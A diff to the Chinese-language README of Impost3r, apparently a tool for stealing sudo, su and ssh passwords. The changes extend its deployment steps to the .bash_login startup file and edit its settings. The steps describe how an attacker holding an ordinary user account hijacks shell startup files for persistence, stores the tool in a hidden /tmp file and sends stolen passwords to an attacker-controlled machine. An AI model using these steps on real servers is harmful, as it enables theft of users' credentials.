@@ -35,7 +35,9 @@ Impost3r可以用来窃取包括sudo、su、ssh服务在内的密码，这三个
 
 - 首先假设攻击者控制了一台服务器，权限为普通用户权限
 
-- 检查用户根目录下是否存在```.bash_profile```文件，如果```.bash_profile```存在:检查```.bash_profile```文件中是否主动加载了```.bashrc```，如果主动加载，则跳过此步骤及下一步检查，继续进行之后的操作,如果未主动加载,那么**下文中所有针对```.bashrc```的操作全部更换为针对```.bash_profile```的操作!!!**;如果```.bash_profile```不存在: 进行下一步检查。
+- 检查用户根目录下是否存在```.bash_profile```文件，如果```.bash_profile```存在:检查```.bash_profile```文件中是否主动加载了```.bashrc```，如果主动加载，则跳过此步骤及下两步检查，继续进行之后的操作,如果未主动加载,那么跳过下两步检查,且**下文中所有针对```.bashrc```的操作全部更换为针对```.bash_profile```的操作!!!**;如果```.bash_profile```不存在: 进行下一步检查。
+
+- 检查用户根目录下是否存在```.bash_login```文件，如果```.bash_login```存在:检查```.bash_login```文件中是否主动加载了```.bashrc```，如果主动加载，则跳过此步骤及下一步检查，继续进行之后的操作,如果未主动加载,那么跳过下一步检查,且**下文中所有针对```.bashrc```的操作全部更换为针对```.bash_login```的操作!!!**;如果```.bash_login```不存在: 进行下一步检查。 
 
 - 检查用户根目录下是否存在```.profile```文件，如果存在```.profile```文件:检查```.profile```文件中是否主动加载了```.bashrc```(默认情况下加载)，如果主动加载，则跳过此步骤，继续进行之后的操作,如果未主动加载,那么**下文中所有针对```.bashrc```的操作全部更换为针对```.profile```的操作!!!**;如果```.profile```也不存在，原则上Impost3r将无法使用，当然你也可以视情况自己决定是否生成```.bash_profile```或者```.profile```文件，并往其中写入类似如下的加载代码来加载```.bashrc```
 
@@ -71,7 +73,7 @@ fi
     Custom setting
 */
 # define FILENAME "/tmp/.impost3r" \\设置Impost3r在目标服务器上的位置
-# define BACKUP_ORI_FILENAME ".bashrc" \\表明攻击者所备份的源用户配置文件是.bashrc还是.bash_profile亦或者是.profile
+# define BACKUP_ORI_FILENAME ".bashrc" \\表明攻击者所备份的源用户配置文件是.bashrc还是.bash_profile、.profile、.bash_login
 # define BACKUP_ORI_PATH "/tmp/.bashrc" \\表明攻击者所备份的源用户配置文件在目标服务器上的位置
 # define SAVE_OR_SEND 0 \\设置在窃取成功后是将结果保存在目标机器上或者是发送至攻击者控制的机器(发送=0，保存=1，默认为发送)
 
